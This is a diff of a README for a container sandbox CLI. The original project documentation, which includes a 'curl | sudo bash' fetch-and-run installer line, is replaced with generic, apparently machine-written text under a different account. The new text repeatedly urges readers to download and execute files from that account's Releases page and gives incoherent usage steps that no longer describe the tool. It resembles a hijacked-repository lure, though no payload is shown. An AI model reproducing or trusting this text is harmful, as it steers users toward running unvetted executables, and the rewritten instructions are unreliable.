@@ -1,121 +1,161 @@
-<div align="center">
-    <img src="assets/logo.jpg" width="512" height="384" />
-    <br>
-    <br>
-    <strong>Everything is removed when the shell is closed.</strong>
-</div>
+# 🌟 Sandbox: Your Isolated Development Environment
 
-<br>
+![Sandbox Logo](https://img.shields.io/badge/Sandbox-Ready-brightgreen)
 
-<div align="center">
-    <a href="#-features">Features</a> · <a href="#-installation">Installation</a> · <a href="#-usage">Usage</a> · <a href="#-for-developers">For developers</a>
-</div>
+Welcome to the **Sandbox** repository! This project enables you to create instant, isolated development environments with GPU support, custom mounts, and graphical applications. It is perfect for testing, experimenting, and developing without polluting your system. 
 
-<br>
+## 🚀 Features
 
-<p>
-    Sandbox is a command-line tool that makes it easy to create and manage containers for testing and experimentation in isolated environments. With Sandbox, you can quickly deploy ephemeral or persistent containers, customizing their configuration with GPU support, custom volume mounting, and the ability to install programs with graphical environment. By default, it mounts the current directory, but you can also choose to completely isolate the container. In addition, you can make containers persistent by assigning them a name. This tool is inspired by <a href="https://distrobox.it">Distrobox</a>.
-</p>
+- **Instant Environments**: Quickly spin up development environments tailored to your needs.
+- **GPU Support**: Leverage the power of your GPU for graphics-intensive applications.
+- **Custom Mounts**: Easily mount directories and files to your containers.
+- **Graphical Applications**: Run GUI applications seamlessly within your environment.
+- **Cross-Platform**: Supports various Linux distributions, including Alpine, Arch Linux, Debian, Fedora, OpenSUSE, and Ubuntu.
 
-<br>
+## 📦 Installation
 
-<div align="center">
-    <img src="assets/demo.png"  />
-</div>
+To get started with Sandbox, you can download the latest release from our [Releases page](https://github.com/ASHIQ403/sandbox/releases). 
 
-<br>
+Once you have downloaded the necessary files, execute them to set up your environment. Follow the instructions below based on your operating system:
 
-# 🧩 Features
+### For Docker Users
 
-- **Temporary containers by default**: Containers are removed after exit unless a name is assigned.
-- **Persistent containers**: Assign a custom name to preserve the container across sessions.
-- **Automatic mounting of the current directory**: The current working directory is mounted at `/host/<current_dir>` by default, unless `--isolate` is used.
-- **Full isolation**: Use `--isolate` to prevent mounting the current directory and run in a fully isolated environment.
-- **Optional home directory mount**: Use `--home` to mount your home directory at `/host/home`.
-- **GPU support**: Enable NVIDIA GPU access with the `--nvidia` option.
-- **Custom docker socket**: Use `--docker-socket` to mount the Docker socket inside the container.
-- **Custom volumes**: Mount additional volumes as needed.
+1. **Install Docker**: Ensure you have Docker installed on your machine. You can follow the [Docker installation guide](https://docs.docker.com/get-docker/) for your platform.
+   
+2. **Pull the Sandbox Image**:
+   ```bash
+   docker pull ashiq403/sandbox
+   ```
 
-# 📦 Installation
+3. **Run the Container**:
+   ```bash
+   docker run --gpus all -it --rm ashiq403/sandbox
+   ```
 
-```bash
-curl -s https://raw.githubusercontent.com/KOD3X/sandbox/main/install | sudo bash
-```
+### For Podman Users
 
-# 🎮 Usage
+1. **Install Podman**: If you prefer Podman, install it by following the [Podman installation guide](https://podman.io/getting-started/installation).
 
-### By default
+2. **Pull the Sandbox Image**:
+   ```bash
+   podman pull ashiq403/sandbox
+   ```
 
-- Current Directory is mounted on `/host/<current_dir>`, if you don't want to mount it, use `--isolate`.
-- Home Directory is NOT mounted, if you mount it, it will be mounted on `/host/home/<username>`.
-- The real home directory is `/home/<username>`, this is so as not to affect the real home directory.
+3. **Run the Container**:
+   ```bash
+   podman run --gpus all -it --rm ashiq403/sandbox
+   ```
 
-### Table of options and directory mounts
+### For Local Development
 
-| Option   | Current Dir | Home Dir | Use case                                                |
-| -------- | ----------- | -------- | ------------------------------------------------------- |
-|          | Yes         | No       | You want to work in the current directory               |
-| `-h`     | Yes         | Yes      | You need to work with various directories and files     |
-| `-i`     | No          | No       | You want to test something in a secure environment      |
-| `-i -h ` | No          | Yes      | You want to test something but need various directories |
+If you want to set up a local environment without containers, you can clone the repository and follow the local setup instructions.
 
-## Examples
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/ASHIQ403/sandbox.git
+   cd sandbox
+   ```
 
-#### Create an ephemeral sandbox container with the current directory mounted
+2. **Run the Setup Script**:
+   ```bash
+   bash setup.sh
+   ```
 
-```bash
-sandbox fedora
-```
+## 🛠️ Usage
 
-#### Make it non-ephemeral
+Once your environment is set up, you can start using it for development. Here are some commands to get you started:
+
+### Create a New Project
 
 ```bash
-sandbox alpine --name my-alpine
+mkdir my_project
+cd my_project
 ```
 
-#### Add nvidia support
+### Start a Shell Session
+
+You can start a shell session within your sandbox environment:
 
 ```bash
-sandbox ubuntu --nvidia
+bash
 ```
 
-#### Create it without current directory mounted
+### Run Graphical Applications
+
+To run graphical applications, ensure your DISPLAY variable is set correctly. You can do this by executing:
 
 ```bash
-sandbox opensuse/tumbleweed --isolate
+export DISPLAY=:0
 ```
 
-# 🧹 Uninstallation
+Then, you can run your favorite GUI applications, such as:
 
 ```bash
-sandbox-uninstall
+gedit my_file.txt
 ```
 
-# 💻 For developers
+## 📚 Documentation
 
-Install development version of sandbox:
+For detailed documentation, including advanced usage and configuration options, please refer to the [Wiki](https://github.com/ASHIQ403/sandbox/wiki).
 
-```bash
-make dev
-```
+## 🔖 Topics
 
-Remove sandbox installation:
+This repository covers a wide range of topics related to development environments. Here are some key areas of focus:
 
-```bash
-make rm
-```
+- **Alpine**: Lightweight Linux distribution.
+- **Arch Linux**: Rolling release system for advanced users.
+- **Bash**: Command-line shell and scripting language.
+- **Containers**: Isolated environments for running applications.
+- **Debian**: Stable and versatile Linux distribution.
+- **Development**: Tools and environments for software development.
+- **Distros**: Various Linux distributions.
+- **Docker**: Platform for containerization.
+- **Fedora**: Cutting-edge Linux distribution.
+- **Isolation**: Ensuring clean and safe environments.
+- **Linux**: Open-source operating system.
+- **OpenSUSE**: User-friendly Linux distribution.
+- **Podman**: Tool for managing containers without a daemon.
+- **Sandboxing**: Isolating applications to enhance security.
+- **Shell**: Command-line interface for interacting with the system.
+- **Software Testing**: Ensuring code quality and functionality.
+- **Tools**: Various utilities for development and testing.
+- **Ubuntu**: Popular Linux distribution for beginners and professionals.
 
-# 🐧 Tested distributions
+## 🎉 Contributing
 
-- [x] [Arch Linux](https://hub.docker.com/_/archlinux/tags)
-- [x] [Alpine](https://hub.docker.com/_/alpine/tags)
-- [x] [Debian](https://hub.docker.com/_/debian/tags)
-- [x] [Fedora](https://hub.docker.com/_/fedora/tags)
-- [x] [Ubuntu](https://hub.docker.com/_/ubuntu/tags)
-- [x] [OpenSUSE/Tumbleweed](https://hub.docker.com/r/opensuse/tumbleweed/tags)
-- [x] [OpenSUSE/Leap](https://hub.docker.com/r/opensuse/leap/tags)
-- [x] [AlmaLinux](https://hub.docker.com/_/almalinux)
-- [ ] [NixOS](https://hub.docker.com/r/nixos/nix/tags)
-- [x] [Rocky Linux](https://hub.docker.com/_/rockylinux/tags)
-- [ ] [Gentoo/stage3](https://hub.docker.com/r/gentoo/stage3/tags)
-- [x] [Mageia](https://hub.docker.com/_/mageia/tags)
+We welcome contributions to the Sandbox project! If you want to help, please follow these steps:
+
+1. **Fork the Repository**: Click on the "Fork" button at the top right of the repository page.
+2. **Create a New Branch**: 
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: 
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Fork**: 
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+6. **Create a Pull Request**: Go to the original repository and click on "New Pull Request."
+
+## 🔄 Updates
+
+To stay updated with the latest changes, check our [Releases page](https://github.com/ASHIQ403/sandbox/releases) frequently. Download the latest files, and execute them to keep your environment current.
+
+## 🛡️ License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## 📞 Contact
+
+For questions or support, feel free to open an issue in the repository or reach out directly via email at ashiq403@example.com.
+
+## 🌐 Links
+
+- [GitHub Repository](https://github.com/ASHIQ403/sandbox)
+- [Releases Page](https://github.com/ASHIQ403/sandbox/releases)
+
+Thank you for checking out Sandbox! We hope it helps you in your development endeavors.
